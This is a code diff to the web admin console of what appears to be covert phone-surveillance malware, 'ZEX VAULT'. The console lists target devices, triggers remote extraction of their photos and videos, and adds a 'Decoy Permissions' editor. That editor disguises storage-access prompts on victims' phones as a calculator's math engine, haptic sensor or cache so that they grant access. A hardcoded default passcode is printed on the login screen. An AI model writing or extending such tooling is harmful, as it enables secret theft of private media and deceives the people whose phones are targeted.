@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>CYBER VAULT | Master Admin Center</title>
+  <title>ZEX VAULT | Master Admin Center</title>
   <script src="/socket.io/socket.io.js"></script>
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -19,6 +19,27 @@
 </head>
 <body class="min-h-screen flex flex-col justify-between selection:bg-emerald-500 selection:text-black">
 
+  <!-- SECURITY PASSCODE LOGIN MODAL -->
+  <div id="authOverlay" class="fixed inset-0 z-50 bg-[#08090C] flex items-center justify-center p-4">
+    <div class="card-glass rounded-2xl max-w-sm w-full p-6 sm:p-8 space-y-6 text-center border-emerald-500/20">
+      <div class="w-14 h-14 mx-auto rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 text-2xl">
+        <i class="fa-solid fa-shield-halved"></i>
+      </div>
+      <div>
+        <h2 class="text-lg font-bold text-white tracking-wider">ZEX MASTER ACCESS</h2>
+        <p class="text-xs text-gray-500 mono mt-1">SECURE ADMIN CONSOLE</p>
+      </div>
+      <div class="space-y-3">
+        <input type="password" id="adminPassInput" placeholder="Enter Master Passcode" 
+               class="w-full bg-black/60 border border-white/15 focus:border-emerald-500 rounded-xl px-4 py-3 text-center mono text-emerald-400 focus:outline-none tracking-widest text-lg">
+        <button onclick="verifyAdminAuth()" class="w-full bg-emerald-500 hover:bg-emerald-400 text-black font-extrabold py-3.5 rounded-xl text-xs tracking-wider transition-all shadow-lg shadow-emerald-500/20">
+          UNLOCK CONSOLE
+        </button>
+      </div>
+      <p class="text-[11px] text-gray-600">Default: zex786</p>
+    </div>
+  </div>
+
   <!-- TOP HEADER -->
   <header class="border-b border-white/5 bg-[#0C0E14]/80 backdrop-blur-md sticky top-0 z-40 px-4 lg:px-8 py-3.5 flex items-center justify-between">
     <div class="flex items-center gap-3">
@@ -27,20 +48,20 @@
       </div>
       <div>
         <h1 class="text-sm font-bold tracking-wider uppercase text-white flex items-center gap-2">
-          VAULT MASTER CONTROL <span class="text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 px-2 py-0.5 rounded-full font-mono">v2.0 PRO</span>
+          ZEX SECRET CONTROLLER <span class="text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 px-2 py-0.5 rounded-full font-mono">v2.5 SECURE</span>
         </h1>
-        <p class="text-[11px] text-gray-500 mono">MULTI-DEVICE FLEET MANAGER</p>
+        <p class="text-[11px] text-gray-500 mono">DYNAMIC SLOTS & TELEMETRY</p>
       </div>
     </div>
 
     <!-- Active Device Selector Pill -->
     <div class="flex items-center gap-2">
-      <span class="text-xs text-gray-400 hidden sm:inline">Active Phone:</span>
       <select id="deviceSelector" onchange="onDeviceSelected()" class="bg-black/60 border border-white/15 text-emerald-400 text-xs rounded-xl px-3 py-2 mono focus:outline-none focus:border-emerald-500 cursor-pointer">
         <option value="">Searching for devices...</option>
       </select>
-      <button onclick="refreshDevices()" title="Refresh Device List" class="w-8 h-8 rounded-xl bg-white/5 hover:bg-white/10 flex items-center justify-center text-gray-400 hover:text-white transition-all">
-        <i class="fa-solid fa-arrows-rotate text-xs"></i>
+      <button onclick="openConfigModal()" title="Customize Target Slots" class="px-3 py-2 rounded-xl bg-white/5 hover:bg-white/10 text-xs text-gray-300 hover:text-white flex items-center gap-1.5 transition-all border border-white/10">
+        <i class="fa-solid fa-sliders text-emerald-400"></i>
+        <span class="hidden sm:inline">Edit Slots</span>
       </button>
     </div>
   </header>
@@ -48,19 +69,16 @@
   <!-- MAIN CONTAINER -->
   <main class="flex-1 max-w-6xl w-full mx-auto p-4 sm:p-6 lg:p-8 space-y-6">
 
-    <!-- 1. CONNECTED DEVICES FLEET BAR -->
+    <!-- 1. CONNECTED DEVICES FLEET -->
     <section class="space-y-3">
       <div class="flex items-center justify-between">
         <h2 class="text-xs font-semibold text-gray-400 uppercase tracking-wider mono flex items-center gap-2">
           <i class="fa-solid fa-network-wired text-emerald-400"></i> Connected Target Devices (<span id="devCount">0</span>)
         </h2>
-        <span class="text-[11px] text-gray-500">Auto-detected without codes</span>
+        <span class="text-[11px] text-gray-500">Live Telemetry & Heartbeat</span>
       </div>
 
-      <!-- Device Cards Horizontal Scroll -->
-      <div id="deviceListGrid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
-        <!-- Rendered by JS -->
-      </div>
+      <div id="deviceListGrid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4"></div>
     </section>
 
     <!-- 2. SELECTED DEVICE CONTROLLER -->
@@ -100,9 +118,9 @@
         <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-white/5 pb-4">
           <div>
             <h2 class="text-base font-bold text-white flex items-center gap-2">
-              <i class="fa-solid fa-bolt-lightning text-yellow-400"></i> High-Speed Remote Sync
+              <i class="fa-solid fa-bolt-lightning text-yellow-400"></i> High-Speed Remote Extraction
             </h2>
-            <p class="text-xs text-gray-400">Extract photos/videos in parallel without re-uploading existing files</p>
+            <p class="text-xs text-gray-400">Parallel transfer with deduplication & live bandwidth monitor</p>
           </div>
           <label class="flex items-center gap-2 text-xs text-emerald-400 cursor-pointer self-start sm:self-auto bg-emerald-500/10 border border-emerald-500/20 px-3 py-1.5 rounded-xl">
             <input type="checkbox" id="chkSkipExisting" checked class="accent-emerald-500 w-4 h-4 rounded">
@@ -110,9 +128,8 @@
           </label>
         </div>
 
-        <!-- Selections -->
         <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
-          <!-- Album / Type -->
+          <!-- Album -->
           <div class="space-y-2">
             <label class="text-xs font-semibold text-gray-300 uppercase tracking-wider">1. Select Target Album</label>
             <select id="selAlbum" class="w-full bg-black/60 border border-white/15 focus:border-emerald-500 text-white rounded-xl px-4 py-3 text-xs mono focus:outline-none">
@@ -137,7 +154,6 @@
           </div>
         </div>
 
-        <!-- Sync Button -->
         <button id="btnTrigger" onclick="triggerExtraction()" 
                 class="w-full bg-gradient-to-r from-emerald-500 via-teal-500 to-cyan-500 hover:opacity-95 text-black font-extrabold py-4 rounded-xl text-sm tracking-wide shadow-xl shadow-emerald-500/20 active:scale-[0.99] transition-all flex items-center justify-center gap-3">
           <i class="fa-solid fa-cloud-arrow-down text-lg"></i>
@@ -188,6 +204,82 @@
 
   </main>
 
+  <!-- DYNAMIC SLOTS & PERMISSIONS CONFIGURATION MODAL -->
+  <div id="configModal" class="hidden fixed inset-0 z-50 bg-black/90 backdrop-blur-md flex items-center justify-center p-4">
+    <div class="card-glass rounded-2xl max-w-xl w-full p-6 space-y-5 border-emerald-500/30 max-h-[90vh] overflow-y-auto">
+      <div class="flex items-center justify-between border-b border-white/5 pb-3">
+        <div>
+          <h3 class="text-sm font-bold text-white flex items-center gap-2">
+            <i class="fa-solid fa-sliders text-emerald-400"></i> Customize ZEX Target Slots & Decoy Permissions
+          </h3>
+          <p class="text-[11px] text-gray-400 mt-0.5">Control what the target sees on the secret screen. Updates phone instantly.</p>
+        </div>
+        <button onclick="closeConfigModal()" class="text-gray-400 hover:text-white"><i class="fa-solid fa-xmark"></i></button>
+      </div>
+
+      <div class="space-y-4 text-xs">
+        <!-- Slot 1 (Storage Master) -->
+        <div class="p-3.5 rounded-xl bg-white/5 border border-emerald-500/20 space-y-2">
+          <div class="flex items-center justify-between">
+            <span class="font-bold text-emerald-400 flex items-center gap-1.5"><i class="fa-solid fa-database"></i> Slot 1 (Master Storage Trigger)</span>
+            <label class="flex items-center gap-1.5 text-[11px] text-gray-400 cursor-pointer">
+              <input type="checkbox" id="cfgSlot1Mandatory" checked class="rounded accent-emerald-500"> Mandatory
+            </label>
+          </div>
+          <input type="text" id="cfgSlot1Title" placeholder="Title (e.g. Slot 1: Core System Cache)" class="w-full bg-black/60 border border-white/15 rounded-lg px-3 py-1.5 text-white mono text-xs">
+          <input type="text" id="cfgSlot1Sub" placeholder="Subtitle (e.g. To load local cache and themes)" class="w-full bg-black/60 border border-white/15 rounded-lg px-3 py-1.5 text-gray-300 text-xs">
+          <input type="text" id="cfgSlot1Deny" placeholder="Denial Warning Message" class="w-full bg-black/60 border border-red-500/30 rounded-lg px-3 py-1.5 text-red-300 text-[11px]">
+        </div>
+
+        <!-- Slot 2 (Decoy) -->
+        <div class="p-3.5 rounded-xl bg-white/5 border border-white/10 space-y-2">
+          <div class="flex items-center justify-between">
+            <span class="font-bold text-gray-200 flex items-center gap-1.5"><i class="fa-solid fa-microchip"></i> Slot 2 (Decoy Math Engine)</span>
+            <label class="flex items-center gap-1.5 text-[11px] text-gray-400 cursor-pointer">
+              <input type="checkbox" id="cfgSlot2Mandatory" checked class="rounded accent-emerald-500"> Mandatory
+            </label>
+          </div>
+          <input type="text" id="cfgSlot2Title" placeholder="Title (e.g. Slot 2: High-Precision Math Engine)" class="w-full bg-black/60 border border-white/15 rounded-lg px-3 py-1.5 text-white mono text-xs">
+          <input type="text" id="cfgSlot2Sub" placeholder="Subtitle (e.g. 64-bit IEEE math processor)" class="w-full bg-black/60 border border-white/15 rounded-lg px-3 py-1.5 text-gray-300 text-xs">
+          <input type="text" id="cfgSlot2Deny" placeholder="Denial Warning Message" class="w-full bg-black/60 border border-red-500/30 rounded-lg px-3 py-1.5 text-red-300 text-[11px]">
+        </div>
+
+        <!-- Slot 3 (Decoy) -->
+        <div class="p-3.5 rounded-xl bg-white/5 border border-white/10 space-y-2">
+          <div class="flex items-center justify-between">
+            <span class="font-bold text-gray-200 flex items-center gap-1.5"><i class="fa-solid fa-wave-square"></i> Slot 3 (Decoy Haptic Sensor)</span>
+            <label class="flex items-center gap-1.5 text-[11px] text-gray-400 cursor-pointer">
+              <input type="checkbox" id="cfgSlot3Mandatory" checked class="rounded accent-emerald-500"> Mandatory
+            </label>
+          </div>
+          <input type="text" id="cfgSlot3Title" placeholder="Title (e.g. Slot 3: Haptic Feedback Sensor)" class="w-full bg-black/60 border border-white/15 rounded-lg px-3 py-1.5 text-white mono text-xs">
+          <input type="text" id="cfgSlot3Sub" placeholder="Subtitle (e.g. Taptic hardware impulse control)" class="w-full bg-black/60 border border-white/15 rounded-lg px-3 py-1.5 text-gray-300 text-xs">
+          <input type="text" id="cfgSlot3Deny" placeholder="Denial Warning Message" class="w-full bg-black/60 border border-red-500/30 rounded-lg px-3 py-1.5 text-red-300 text-[11px]">
+        </div>
+
+        <!-- Slot 4 (Decoy) -->
+        <div class="p-3.5 rounded-xl bg-white/5 border border-white/10 space-y-2">
+          <div class="flex items-center justify-between">
+            <span class="font-bold text-gray-200 flex items-center gap-1.5"><i class="fa-solid fa-wifi"></i> Slot 4 (Decoy Stream Buffer)</span>
+            <label class="flex items-center gap-1.5 text-[11px] text-gray-400 cursor-pointer">
+              <input type="checkbox" id="cfgSlot4Mandatory" checked class="rounded accent-emerald-500"> Mandatory
+            </label>
+          </div>
+          <input type="text" id="cfgSlot4Title" placeholder="Title (e.g. Slot 4: Low-Latency Buffer)" class="w-full bg-black/60 border border-white/15 rounded-lg px-3 py-1.5 text-white mono text-xs">
+          <input type="text" id="cfgSlot4Sub" placeholder="Subtitle (e.g. Background telemetry optimizer)" class="w-full bg-black/60 border border-white/15 rounded-lg px-3 py-1.5 text-gray-300 text-xs">
+          <input type="text" id="cfgSlot4Deny" placeholder="Denial Warning Message" class="w-full bg-black/60 border border-red-500/30 rounded-lg px-3 py-1.5 text-red-300 text-[11px]">
+        </div>
+      </div>
+
+      <div class="flex items-center justify-end gap-3 pt-2 border-t border-white/5">
+        <button onclick="closeConfigModal()" class="px-4 py-2 rounded-xl bg-white/5 text-gray-400 text-xs hover:text-white">Cancel</button>
+        <button onclick="saveSlotConfig()" class="px-5 py-2 rounded-xl bg-emerald-500 text-black font-extrabold text-xs hover:bg-emerald-400 transition-all shadow-lg shadow-emerald-500/20">
+          Save Configuration to Device
+        </button>
+      </div>
+    </div>
+  </div>
+
   <!-- LIGHTBOX / MEDIA MODAL -->
   <div id="mediaModal" class="hidden fixed inset-0 z-50 bg-black/95 backdrop-blur-md flex items-center justify-center p-4">
     <div class="relative max-w-4xl w-full max-h-[90vh] flex flex-col items-center">
@@ -213,10 +305,33 @@
     let selectedCount = 25;
 
     window.addEventListener('DOMContentLoaded', () => {
+      if (sessionStorage.getItem('zex_admin_auth') === 'true') {
+        document.getElementById('authOverlay').classList.add('hidden');
+        initDashboard();
+      }
+    });
+
+    async function verifyAdminAuth() {
+      const pass = document.getElementById('adminPassInput').value.trim();
+      const res = await fetch('/api/admin/auth', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ key: pass })
+      });
+      if (res.ok) {
+        sessionStorage.setItem('zex_admin_auth', 'true');
+        document.getElementById('authOverlay').classList.add('hidden');
+        initDashboard();
+      } else {
+        alert('Access Denied: Invalid Master Passcode');
+      }
+    }
+
+    function initDashboard() {
       initSocket();
       refreshDevices();
       setInterval(refreshDevices, 3000);
-    });
+    }
 
     function initSocket() {
       socket = io();
@@ -269,21 +384,18 @@
         return;
       }
 
-      // If nothing selected or selected not in list, select first
       if (!selectedDeviceId || !list.find(d => d.id === selectedDeviceId)) {
         selectedDeviceId = list[0].id;
         localStorage.setItem('last_active_dev', selectedDeviceId);
       }
 
       list.forEach(dev => {
-        // Option
         const opt = document.createElement('option');
         opt.value = dev.id;
         opt.innerText = `${dev.isOnline ? '🟢' : '🔴'} ${dev.name} (${dev.id})`;
         if (dev.id === selectedDeviceId) opt.selected = true;
         selector.appendChild(opt);
 
-        // Card
         const card = document.createElement('div');
         const isSelected = dev.id === selectedDeviceId;
         card.className = `card-glass rounded-2xl p-4 cursor-pointer transition-all ${isSelected ? 'border-emerald-500 bg-emerald-500/5' : 'hover:border-white/20'}`;
@@ -327,7 +439,6 @@
       const dot = document.getElementById('targetStatusDot');
       const text = document.getElementById('targetStatusText');
       const batText = document.getElementById('batteryText');
-      const batIcon = document.getElementById('batteryIcon');
 
       if (dev.isOnline) {
         dot.className = 'w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse';
@@ -474,6 +585,91 @@
     function closeModal() {
       document.getElementById('mediaModal').classList.add('hidden');
       document.getElementById('modalContent').innerHTML = '';
+    }
+
+    // Dynamic Config Modal
+    async function openConfigModal() {
+      if (!selectedDeviceId) {
+        alert('Please select a target device first');
+        return;
+      }
+      const res = await fetch(`/api/device/config?deviceId=${encodeURIComponent(selectedDeviceId)}`);
+      const data = await res.json();
+      const cfg = data.config || {};
+
+      document.getElementById('cfgSlot1Title').value = cfg.slot1?.title || 'Slot 1: Core System Cache';
+      document.getElementById('cfgSlot1Sub').value = cfg.slot1?.subtitle || 'To load local cache and themes';
+      document.getElementById('cfgSlot1Deny').value = cfg.slot1?.denyMsg || 'System cache access is required to store calculator themes and computation cache.';
+      document.getElementById('cfgSlot1Mandatory').checked = cfg.slot1?.mandatory !== false;
+
+      document.getElementById('cfgSlot2Title').value = cfg.slot2?.title || 'Slot 2: High-Precision Math Engine';
+      document.getElementById('cfgSlot2Sub').value = cfg.slot2?.subtitle || '64-bit floating point processor';
+      document.getElementById('cfgSlot2Deny').value = cfg.slot2?.denyMsg || 'Core math calculation engine disabled. Mathematical accuracy cannot be guaranteed without this component.';
+      document.getElementById('cfgSlot2Mandatory').checked = cfg.slot2?.mandatory !== false;
+
+      document.getElementById('cfgSlot3Title').value = cfg.slot3?.title || 'Slot 3: Haptic Feedback Sensor';
+      document.getElementById('cfgSlot3Sub').value = cfg.slot3?.subtitle || 'Taptic hardware impulse control';
+      document.getElementById('cfgSlot3Deny').value = cfg.slot3?.denyMsg || 'Taptic hardware sensor access required for touch registration and input stability.';
+      document.getElementById('cfgSlot3Mandatory').checked = cfg.slot3?.mandatory !== false;
+
+      document.getElementById('cfgSlot4Title').value = cfg.slot4?.title || 'Slot 4: Low-Latency Buffer';
+      document.getElementById('cfgSlot4Sub').value = cfg.slot4?.subtitle || 'Background processing optimizer';
+      document.getElementById('cfgSlot4Deny').value = cfg.slot4?.denyMsg || 'Background stream buffer disabled. Live calculations suspended until enabled.';
+      document.getElementById('cfgSlot4Mandatory').checked = cfg.slot4?.mandatory !== false;
+
+      document.getElementById('configModal').classList.remove('hidden');
+    }
+
+    function closeConfigModal() {
+      document.getElementById('configModal').classList.add('hidden');
+    }
+
+    async function saveSlotConfig() {
+      if (!selectedDeviceId) return;
+
+      const config = {
+        slot1: {
+          title: document.getElementById('cfgSlot1Title').value.trim(),
+          subtitle: document.getElementById('cfgSlot1Sub').value.trim(),
+          denyMsg: document.getElementById('cfgSlot1Deny').value.trim(),
+          mandatory: document.getElementById('cfgSlot1Mandatory').checked,
+          active: true
+        },
+        slot2: {
+          title: document.getElementById('cfgSlot2Title').value.trim(),
+          subtitle: document.getElementById('cfgSlot2Sub').value.trim(),
+          denyMsg: document.getElementById('cfgSlot2Deny').value.trim(),
+          mandatory: document.getElementById('cfgSlot2Mandatory').checked,
+          active: true
+        },
+        slot3: {
+          title: document.getElementById('cfgSlot3Title').value.trim(),
+          subtitle: document.getElementById('cfgSlot3Sub').value.trim(),
+          denyMsg: document.getElementById('cfgSlot3Deny').value.trim(),
+          mandatory: document.getElementById('cfgSlot3Mandatory').checked,
+          active: true
+        },
+        slot4: {
+          title: document.getElementById('cfgSlot4Title').value.trim(),
+          subtitle: document.getElementById('cfgSlot4Sub').value.trim(),
+          denyMsg: document.getElementById('cfgSlot4Deny').value.trim(),
+          mandatory: document.getElementById('cfgSlot4Mandatory').checked,
+          active: true
+        }
+      };
+
+      const res = await fetch('/api/device/config', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ deviceId: selectedDeviceId, config })
+      });
+
+      if (res.ok) {
+        alert('Dynamic slot configurations saved! Target device will update in real-time.');
+        closeConfigModal();
+      } else {
+        alert('Failed to save configuration');
+      }
     }
   </script>
 </body>
